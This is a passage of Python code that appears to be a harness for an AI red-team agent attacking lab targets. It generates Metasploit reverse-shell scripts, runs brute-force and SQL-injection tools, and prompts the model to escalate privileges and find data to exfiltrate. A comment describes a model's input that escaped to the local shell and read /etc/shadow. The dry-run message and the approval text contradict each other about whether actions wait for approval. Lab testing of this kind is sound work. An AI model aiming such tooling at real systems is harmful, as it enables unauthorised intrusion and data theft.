    `sessions -c` addresses session 1 -- both were confirmed necessary against
    every module in ALLOWED_MSF_MODULES, not just the flaky ones.

    session_commands is the intended path for privilege escalation once a
    module lands a non-root shell (distcc_exec does, as 'daemon'): run
    recon/privesc checks on the session in the same call rather than needing
    a second one, since sessions don't persist across separate msfconsole
    invocations (no msfrpcd running here) -- there is no "reconnect to the
    session from a later call" available.
    """
    redteam_exec.validate_target(target)
    if target != "metasploitable":
        raise ValueError("msf_run_module only targets metasploitable")
    module = params.get("module")
    if module not in ALLOWED_MSF_MODULES:
        raise ValueError(f"module must be one of {sorted(ALLOWED_MSF_MODULES)}, got {module!r}")
    spec = ALLOWED_MSF_MODULES[module]

    session_commands = params.get("session_commands") or ["id", "hostname", "uname -a"]
    if isinstance(session_commands, str):
        session_commands = [session_commands]
    # Resource-script syntax, not shell syntax -- sessions -c takes one
    # double-quoted argument on ONE line. An embedded " would terminate that
    # argument early; an embedded newline is worse -- it ends the whole
    # resource-script LINE, and everything after it becomes separate
    # top-level msfconsole commands instead of session input. Observed live:
    # a model sent a heredoc-style session_commands string ('cmd <<EOF\n...
    # \nEOF'); msfconsole's parser choked on the truncated sessions -c line,
    # then ran the leftover lines (id, whoami, cat /etc/shadow) as bare
    # commands -- which, unrecognized as console commands, fell through to
    # msfconsole's LOCAL shell-exec passthrough (logged as "[*] exec: id",
    # distinct from "Running ... on shell session N") and returned
    # soc-attacker's OWN root shadow file, not metasploitable's. Collapsing
    # embedded newlines to "; " before the quote-escape closes that: any
    # multi-line input becomes one syntactically sane, semicolon-joined
    # command sent to the REMOTE session, same as how the list's own entries
    # are already joined, instead of an msfconsole scope escape.
    session_cmd_line = "; ".join(
        "; ".join(c.replace('"', "'").splitlines()) for c in session_commands
    )

    attacker_ip = redteam_exec.attacker_ip()
    if not attacker_ip:
        raise ValueError("could not resolve soc-attacker's own bridge IP for LHOST")
    lport = int(params.get("lport", 4444))
    timeout_s = 300 if unrestricted else 120

    lines = [f"use {module}"]
    if spec["payload"]:
        lines.append(f"set PAYLOAD {spec['payload']}")
    lines.append(f"set RHOSTS {target}")
    lines.append(f"set LHOST {attacker_ip}")
    lines.append(f"set LPORT {lport}")
    for k, v in (params.get("options") or {}).items():
        lines.append(f"set {k} {v}")
    lines += [
        "check",
        "exploit -z",
        "sleep 3",
        f'sessions -c "{session_cmd_line}" -1',
        "sessions -K",
        "exit -y",
    ]

    rc_host, rc_ctr = _loot_paths(session_id, f"msf-{module.replace('/', '_')}-{int(time.time())}.rc")
    with open(rc_host, "w") as f:
        f.write("\n".join(lines) + "\n")

    argv = ["msfconsole", "-q", "-r", rc_ctr]
    result = redteam_exec.run(argv, timeout_s=timeout_s)
    return result, rc_ctr


GATED_EXECUTORS = {
    "hydra_bruteforce": _exec_hydra_bruteforce,
    "sqlmap_scan": _exec_sqlmap_scan,
    "ssh_exec": _exec_ssh_exec,
    "msf_run_module": _exec_msf_run_module,
}


def _scan_for_cowrie_flag(conn, session_id, target, text, pending_action_id):
    for match in FLAG_RE.findall(text or ""):
        exists = conn.execute(
            "SELECT 1 FROM captured_flags WHERE session_id=? AND flag_value=?",
            (session_id, match),
        ).fetchone()
        if exists:
            continue
        conn.execute(
            "INSERT INTO captured_flags (session_id, target, flag_value, method, pending_action_id, created) "
            "VALUES (?,?,?,?,?,?)",
            (session_id, target, match, "regex-match-in-tool-output", pending_action_id, now_iso()),
        )


def _check_juiceshop_flags(conn, session_id, pending_action_id):
    """Juice Shop's CTF flags never appear literally in any tool output --
    they're HMAC-SHA1(CTF_KEY, challenge.name), surfaced to a browser via a
    websocket notification when a challenge's solve condition is met (see
    build/lib/challengeUtils.js, verified against the running container).
    Reproducing that HMAC ourselves against /api/Challenges's `solved` flag
    is simpler and more reliable than intercepting the socket. No-ops
    quietly if CTF_KEY isn't set or nginx isn't reachable -- this is a
    best-effort enrichment, not something that should fail a session."""
    ctf_key = os.environ.get("CTF_KEY")
    if not ctf_key:
        return
    try:
        with urllib.request.urlopen(f"{JUICESHOP_HOST_URL}/api/Challenges", timeout=10) as r:
            data = json.loads(r.read().decode("utf-8"))
    except (urllib.error.URLError, OSError, ValueError):
        return

    already = {
        row["flag_value"] for row in conn.execute(
            "SELECT flag_value FROM captured_flags WHERE session_id=?", (session_id,)
        ).fetchall()
    }
    for ch in data.get("data", []):
        if not ch.get("solved"):
            continue
        flag = hmac.new(ctf_key.encode(), ch["name"].encode(), hashlib.sha1).hexdigest()
        if flag in already:
            continue
        conn.execute(
            "INSERT INTO captured_flags (session_id, target, flag_value, method, pending_action_id, created) "
            "VALUES (?,?,?,?,?,?)",
            (session_id, "nginx", flag, f"juiceshop-ctf:{ch['name']}", pending_action_id, now_iso()),
        )


def execute_pending_action(conn, row):
    """The only function in this file that calls redteam_exec.run() for a
    gated tool. Only ever called from cmd_execute_approved(), which only
    ever hands it rows where approved=1. Makes no model call."""
    tool = row["tool"]
    target = row["target"]
    params = json.loads(row["input_json"])
    if isinstance(params, str):
        # Defensive unwrap for rows written before tool_propose_action's own
        # fix (or by anything else that slips a JSON-encoded string past it)
        # -- a double-encoded params here would otherwise crash the executor
        # on params.get(...) against a str instead of a dict.
        params = json.loads(params)
    session_id = row["session_id"]
    ts = now_iso()

    executor = GATED_EXECUTORS.get(tool)
    if executor is None:
        conn.execute(
            "UPDATE pending_actions SET executed=1, executed_at=?, result_json=? WHERE id=?",
            (ts, json.dumps({"error": f"unknown tool {tool!r}"}), row["id"]),
        )
        conn.commit()
        return

    unrestricted = redteam_exec.in_whitelisted_network(target)
    try:
        result, loot_ctr_path = executor(session_id, target, params, unrestricted)
    except (redteam_exec.ScopeError, ValueError) as e:
        conn.execute(
            "UPDATE pending_actions SET executed=1, executed_at=?, result_json=? WHERE id=?",
            (ts, json.dumps({"error": str(e)}), row["id"]),
        )
        conn.commit()
        return

    result_dict = {
        "exit_code": result.exit_code, "timed_out": result.timed_out,
        "stdout": result.stdout, "stderr": result.stderr, "elapsed_s": result.elapsed_s,
    }
    conn.execute(
        "UPDATE pending_actions SET executed=1, executed_at=?, result_json=? WHERE id=?",
        (ts, json.dumps(result_dict), row["id"]),
    )
    _record_loot(
        conn, session_id, row["id"], tool, target,
        loot_ctr_path or "(stdout/stderr only, see pending_actions.result_json)",
        (result.stdout + result.stderr)[:2000], result.exit_code,
    )
    _scan_for_cowrie_flag(conn, session_id, target, result.stdout + result.stderr, row["id"])
    _check_juiceshop_flags(conn, session_id, row["id"])
    conn.commit()


# ---------------------------------------------------------------------------
# Stage runner
# ---------------------------------------------------------------------------

def _preview(value, n=120):
    """One-line, length-capped preview for console progress -- never the
    thing that's actually persisted or sent back to the model, just what a
    human watching stdout sees go by."""
    s = value if isinstance(value, str) else json.dumps(value, default=str)
    s = " ".join(s.split())  # collapse newlines/indentation
    return s if len(s) <= n else s[:n] + "..."


def _progress_wrapper(dispatch_fn, conn, session_id):
    """Wraps a dispatch_*_tool function so every tool call the model makes
    prints to stdout as it happens -- this is the actual unit of "progress"
    in a stage that can otherwise sit silent for a long time waiting on a
    local model. Timing included since some tools (nmap, sqlmap) are slow."""
    def execute(name, tool_input):
        print(f"    -> {name}({_preview(tool_input, 100)})")
        t0 = time.monotonic()
        result_text, is_error = dispatch_fn(conn, session_id, name, tool_input)
        elapsed = time.monotonic() - t0
        status = "ERROR" if is_error else "ok"
        print(f"       {status} in {elapsed:.1f}s: {_preview(result_text, 140)}")
        return result_text, is_error
    return execute


def run_stage_turn(provider, system, user, tools, execute_tool, max_iterations):
    """Uniform call across providers despite their run_agentic_turn()
    signatures legitimately differing one level down: Claude's Messages API
    keeps `system` as its own top-level field, Ollama's /api/chat embeds it
    as a message. Mirrors how Provider.complete()'s own (system, user, tools,
    execute_tool) signature already abstracts over the same vendor
    difference one layer up -- this is the same abstraction at the
    lower-level agentic-turn API."""
    if isinstance(provider, ClaudeProvider):
        messages = [{"role": "user", "content": [{"type": "text", "text": user}]}]
        return provider.run_agentic_turn(system, messages, tools, execute_tool, max_iterations)
    messages = [{"role": "system", "content": system}, {"role": "user", "content": user}]
    return provider.run_agentic_turn(messages, tools, execute_tool, max_iterations)


def run_recon_stage(conn, session_id, provider, max_iterations):
    user = (
        "Begin reconnaissance. Targets in scope: cowrie (SSH), nginx (web, "
        "reverse-proxies an internal app), metasploitable (a real vulnerable "
        "Linux host with many services). Use your tools to identify what's exposed."
    )
    print("    waiting on model (first call can take a while on local models)...")
    execute = _progress_wrapper(dispatch_recon_tool, conn, session_id)

    result = run_stage_turn(provider, RECON_SYSTEM_PROMPT, user, RECON_TOOLS, execute, max_iterations)
    conn.execute(
        "UPDATE redteam_sessions SET stage='assess', recon_summary=? WHERE id=?",
        (result.final_text, session_id),
    )
    conn.commit()
    print(f"    recon summary: {_preview(result.final_text, 200)}")
    return result


def run_assess_stage(conn, session_id, provider, max_iterations, is_continuation=False):
    """A single assess pass. Called once per campaign normally, but nothing
    about it depends on recon having *just* run -- it only ever reads this
    session's recon_findings/loot/pending_actions through the ASSESS_TOOLS.
    That means it's safe to call again later, after a human has approved and
    executed a proposed action: the model sees the new loot/result_json (a
    credential that worked, a shell's output, ...) and can propose the next
    step from there. Each real action still goes through the same gate --
    this only lets the model look again, never act more than once per call."""
    if is_continuation:
        user = (
            "Continue the assessment for this session. New evidence may be "
            "available since your last pass -- results from an executed "
            "action, new loot, possibly a working credential or shell "
            "access. Use get_pending_actions (includes result_json for "
            "anything already executed) and get_loot to see what's happened "
            "since you last looked. If you now have a working credential or "
            "command execution on a target, use that to investigate "
            "further: what's on the system, signs of other users, "
            "services, or hosts reachable from there, anything worth "
            "exfiltrating, or a path to escalate privileges. If a proposed "
            "credential was tried and failed, that doesn't mean the "
            "approach is wrong -- a real breach dump usually has several "
            "credentials in it, and a single wrong or rate-limited guess "
            "isn't proof the rest won't work. If you still have untried "
            "credentials from a finding, propose trying another one before "
            "concluding there's nothing left to do. Propose whatever's "
            "warranted next, or say clearly if you've genuinely exhausted "
            "what's worth trying."
        )
    else:
        user = (
            "Review the recon findings from this session and assess what's worth "
            "acting on. Record vulnerability findings and propose any actions you "
            "believe are warranted."
        )
    print("    waiting on model...")
    execute = _progress_wrapper(dispatch_assess_tool, conn, session_id)

    result = run_stage_turn(provider, ASSESS_SYSTEM_PROMPT, user, ASSESS_TOOLS, execute, max_iterations)
    row = conn.execute("SELECT assess_summary FROM redteam_sessions WHERE id=?", (session_id,)).fetchone()
    prior = (row["assess_summary"] or "") if row else ""
    combined = f"{prior}\n\n--- assess round, {now_iso()} ---\n{result.final_text}" if prior else result.final_text
    conn.execute(
        "UPDATE redteam_sessions SET stage='done', assess_summary=? WHERE id=?",
        (combined, session_id),
    )
    conn.commit()
    print(f"    assess summary: {_preview(result.final_text, 200)}")
    return result


def start_session(conn, provider_name, model):
    ts = now_iso()
    ip = redteam_exec.attacker_ip()
    cur = conn.execute(
        "INSERT INTO redteam_sessions (started, provider, model, attacker_ip, stage, status, created) "
        "VALUES (?,?,?,?,'recon','running',?)",
        (ts, provider_name, model, ip, ts),
    )
    conn.commit()
    return cur.lastrowid, ip


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_provider(name, model):
    resolved = model or DEFAULT_MODEL[name]
    if name == "claude":
        return ClaudeProvider(model=resolved)
    if name == "local":
        return LocalProvider(model=resolved)
    if name == "gmi":
        return GMIProvider(model=resolved)
    if name == "fireworks":
        return FireworksProvider(model=resolved)
    raise ValueError(f"unknown provider: {name}")


def cmd_list_pending(conn):
    rows = conn.execute(
        "SELECT id, session_id, tool, target, input_json, rationale, "
        "approved, executed, created FROM pending_actions "
        "WHERE approved=0 OR executed=0 ORDER BY id"
    ).fetchall()
    if not rows:
        print("[*] no pending actions awaiting approval or execution")
        return
    for r in rows:
        print(f"--- pending #{r['id']} (session {r['session_id']}) ---")
        print(f"  tool:      {r['tool']}")
        print(f"  target:    {r['target']}")
        print(f"  rationale: {r['rationale']}")
        print(f"  approved:  {bool(r['approved'])}    executed: {bool(r['executed'])}")
        # Full, unsummarized -- a human approving this MUST see the exact
        # params, especially for ssh_exec's free-text `command`.
        print(f"  params:    {r['input_json']}")
        print()


def cmd_approve(conn, action_id, approved_by):
    ts = now_iso()
    cur = conn.execute(
        "UPDATE pending_actions SET approved=1, approved_by=?, approved_at=? "
        "WHERE id=? AND approved=0",
        (approved_by, ts, action_id),
    )
    conn.commit()
    if cur.rowcount == 0:
        print(f"[!] no unapproved pending action with id={action_id}")
    else:
        print(f"[*] approved pending action #{action_id} (by {approved_by})")


def cmd_execute_approved(conn, limit, dry_run):
    sql = "SELECT * FROM pending_actions WHERE approved=1 AND executed=0 ORDER BY id"
    if limit:
        sql += f" LIMIT {int(limit)}"
    rows = conn.execute(sql).fetchall()
    if not rows:
        print("[*] nothing approved-and-unexecuted")
        return
    for r in rows:
        if dry_run:
            print(f"[*] --dry-run: would execute #{r['id']} tool={r['tool']} target={r['target']}")
            print(f"    params: {r['input_json']}")
            continue
        print(f"[*] executing #{r['id']} tool={r['tool']} target={r['target']} "
              f"(can take a while -- {r['tool']} runs with its own multi-minute timeout)...")
        t0 = time.monotonic()
        execute_pending_action(conn, r)
        elapsed = time.monotonic() - t0
        row = conn.execute("SELECT result_json FROM pending_actions WHERE id=?", (r["id"],)).fetchone()
        result = json.loads(row["result_json"])
        if "error" in result and "exit_code" not in result:
            print(f"    FAILED in {elapsed:.1f}s: {result['error']}")
            continue
        print(f"    done in {elapsed:.1f}s: exit_code={result.get('exit_code')} "
              f"timed_out={result.get('timed_out')}")
        new_flags = conn.execute(
            "SELECT flag_value FROM captured_flags WHERE pending_action_id=?", (r["id"],)
        ).fetchall()
        for f in new_flags:
            print(f"    *** flag captured: {f['flag_value']}")
    if dry_run:
        print("\n[*] nothing executed -- this is the plan only.")


def cmd_stats(conn):
    print("\n=== redteam_sessions ===")
    for r in conn.execute(
        "SELECT stage, status, COUNT(*) n FROM redteam_sessions GROUP BY stage, status ORDER BY n DESC"
    ):
        print(f"  {r['stage']:<8} {r['status']:<10} {r['n']:>4}")

    n_recon = conn.execute("SELECT COUNT(*) n FROM recon_findings").fetchone()["n"]
    n_vuln = conn.execute("SELECT COUNT(*) n FROM vuln_findings").fetchone()["n"]
    print(f"\n  recon_findings: {n_recon:>5}")
    print(f"  vuln_findings:  {n_vuln:>5}")

    print("\n=== pending_actions ===")
    for r in conn.execute(
        "SELECT approved, executed, COUNT(*) n FROM pending_actions GROUP BY approved, executed"
    ):
        state = {
            (0, 0): "awaiting approval",
            (1, 0): "approved, awaiting execution",
            (1, 1): "executed",
        }.get((r["approved"], r["executed"]), "?")
        print(f"  {state:<32} {r['n']:>4}")
    print("  (recommend/execute-only via --approve then --execute-approved -- "
          "nothing here runs on its own)")

    n_loot = conn.execute("SELECT COUNT(*) n FROM loot").fetchone()["n"]
    print(f"\n  loot artifacts: {n_loot:>5}")

    print("\n=== captured_flags ===")
    for r in conn.execute(
        "SELECT target, COUNT(*) n FROM captured_flags GROUP BY target"
    ):
        print(f"  {r['target']:<8} {r['n']:>4}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dry-run", action="store_true",
                     help="print what would happen, call no API, run no docker exec")
    ap.add_argument("--provider", choices=["claude", "local", "gmi", "fireworks"], default=DEFAULT_PROVIDER,
                     help=f"default: {DEFAULT_PROVIDER} (cheapest to smoke-test)")
    ap.add_argument("--model", default=None, help="override the provider's default model")
    ap.add_argument("--max-iterations", type=int, default=None,
                     help="override both stages' tool-call budget (default: "
                          f"recon={RECON_MAX_ITERATIONS}, assess={ASSESS_MAX_ITERATIONS})")
    ap.add_argument("--stats", action="store_true", help="show session/finding/pending counts, then exit")
    ap.add_argument("--list-pending", action="store_true", help="list pending_actions awaiting approval/execution")
    ap.add_argument("--approve", type=int, default=None, metavar="ID",
                     help="flip approved=1 on one pending_actions row; nothing else")
    ap.add_argument("--approved-by", default=os.environ.get("USER", "operator"))
    ap.add_argument("--execute-approved", action="store_true",
                     help="run approved-but-unexecuted rows through redteam_exec; makes no model call")
    ap.add_argument("--limit", type=int, default=None,
                     help="cap how many rows --execute-approved runs in one invocation")
    ap.add_argument("--continue-assess", type=int, default=None, metavar="SESSION_ID",
                     help="re-run just the assess stage on an existing session, so the "
                          "model can react to results from an approved+executed action "
                          "(e.g. a working credential) and propose what's next")
    args = ap.parse_args()

    conn = connect()
    print(f"[*] db: {DB_PATH}")

    if args.list_pending:
        cmd_list_pending(conn)
        return

    if args.approve is not None:
        cmd_approve(conn, args.approve, args.approved_by)
        return

    if args.execute_approved:
        cmd_execute_approved(conn, args.limit, args.dry_run)
        return

    if args.continue_assess is not None:
        session_id = args.continue_assess
        row = conn.execute("SELECT provider, model FROM redteam_sessions WHERE id=?", (session_id,)).fetchone()
        if row is None:
            print(f"[!] no session with id={session_id}")
            return
        provider = build_provider(row["provider"], args.model or row["model"])
        print(f"[*] continuing assess on session {session_id} via "
              f"provider={row['provider']} model={provider.model}")
        assess_budget = args.max_iterations or ASSESS_MAX_ITERATIONS
        result = run_assess_stage(conn, session_id, provider, assess_budget, is_continuation=True)
        print(f"    {result.tool_calls} tool call(s)")
        cmd_stats(conn)
        return

    if args.stats:
        cmd_stats(conn)
        return

    if args.dry_run:
        resolved = args.model or DEFAULT_MODEL[args.provider]
        print(f"[*] --dry-run: would run a recon+assess campaign via "
              f"provider={args.provider} model={resolved}")
        print(f"    RECON  tools: {[t['name'] for t in RECON_TOOLS]}")
        print(f"    ASSESS tools: {[t['name'] for t in ASSESS_TOOLS]}")
        print("    Any exploitation/lateral-move/exfil action against a target inside "
              f"redteam_exec.ALLOWED_NETWORKS ({[str(n) for n in redteam_exec.ALLOWED_NETWORKS]}, "
              "currently all of cowrie/nginx/metasploitable) EXECUTES IMMEDIATELY when "
              "proposed -- no --approve/--execute-approved round trip. A target outside "
              "that range would only be PROPOSED (pending_actions) and wait for one.")
        print("\n[*] nothing written -- this is the plan only. No API call, no docker exec.")
        return

    provider = build_provider(args.provider, args.model)
    max_iterations = args.max_iterations  # None is fine; stages fall back to their own defaults
    recon_budget = max_iterations or RECON_MAX_ITERATIONS
    assess_budget = max_iterations or ASSESS_MAX_ITERATIONS

    session_id, attacker_ip = start_session(conn, args.provider, provider.model)
    print(f"[*] session {session_id} started, attacker_ip={attacker_ip}, "
          f"provider={args.provider} model={provider.model}")

    print("[*] stage: recon")
    recon_result = run_recon_stage(conn, session_id, provider, recon_budget)
    print(f"    {recon_result.tool_calls} tool call(s)")
    if recon_result.usage:
        u = recon_result.usage
        print(f"    tokens: {u['prompt_tokens']} prompt / {u['completion_tokens']} "
              f"completion / {u['total_tokens']} total")

    print("[*] stage: assess")
    assess_result = run_assess_stage(conn, session_id, provider, assess_budget)
    print(f"    {assess_result.tool_calls} tool call(s)")
    if assess_result.usage:
        u = assess_result.usage
        print(f"    tokens: {u['prompt_tokens']} prompt / {u['completion_tokens']} "
              f"completion / {u['total_tokens']} total")

    conn.execute(
        "UPDATE redteam_sessions SET status='completed', ended=? WHERE id=?",
        (now_iso(), session_id),
    )
    conn.commit()

    if recon_result.usage and assess_result.usage:
        total = {
            k: recon_result.usage[k] + assess_result.usage[k]
            for k in ("prompt_tokens", "completion_tokens", "total_tokens")
        }
        print(f"\n[*] campaign token usage: {total['prompt_tokens']} prompt / "
              f"{total['completion_tokens']} completion / {total['total_tokens']} total")

    print(f"\n[*] session {session_id} complete.")
    cmd_stats(conn)


if __name__ == "__main__":
    main()
